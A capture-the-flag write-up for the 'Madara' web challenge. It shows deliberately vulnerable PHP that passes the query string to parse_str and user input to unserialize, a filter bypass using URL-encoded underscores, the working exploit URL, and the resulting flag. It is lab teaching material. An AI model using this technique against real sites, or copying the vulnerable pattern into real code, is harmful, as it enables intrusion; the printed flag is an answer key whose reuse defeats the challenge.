# Web / Madara

## Challenge
This is an easy task for such a good hacker, go get me the flag.

## Inputs
- We can spawn a Web page instance at http://instances.challenge-ecw.fr:39165

## Solution
Here's the php code that is running:

```php
<?php
//Config
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(0);
//Some Jutsu :D
highlight_file(__FILE__);
include 'secret.php' ;
$_=['_'=>'YogoshaBlaBlaBla','__'=>'Grr'];
foreach($_ as $k=>$v){
    ${'_'.$k}=$v ;
    }
$query=$_SERVER["QUERY_STRING"];
parse_str($query);
if ((substr_count($query,'_')>=4)||(substr_count($query,'.')>0)){
    die('You have used too much _');
}
if(@$__==='Madara'){
    if(unserialize(@$___)['o']['k']==='imBored'){
        echo $flag ;}
    else die("No No");
}
else die("it's too EZ go go");
?>
```

So we need to pass two variables `__` and `___` in the query, satisfying:
- $__ = 'Madara'
- unserialize($___)['o']['k'] = 'imBored'
- Do not pass more than 3 `_`

The first and last requirements are easy. We just pass this query string with `URL-encoded` underscores (%5f):
> http://instances.challenge-ecw.fr:39165/?%5f%5f=Madara

For the second requirement, we need to serialize a dictionary (inside another dictionary). Let's do that:

```console
$ php -a
Interactive shell

php > $a= array( 'k' => 'imBored' );
php > $b= array( 'o' => $a);
php > print($b['o']['k']);
imBored
php > $s = serialize($b);
php > print($s);
a:1:{s:1:"o";a:1:{s:1:"k";s:7:"imBored";}}
```

We just have to pass that serialized string to variable `___` as follow:
> http://instances.challenge-ecw.fr:39165/?%5f%5f=Madara&___=a:1:{s:1:%22o%22;a:1:{s:1:%22k%22;s:7:%22imBored%22;}}

That way, we pass the checks and get the flag!

## Flag
ECW{C3u7pdBCAfsmbp8eq5T2}
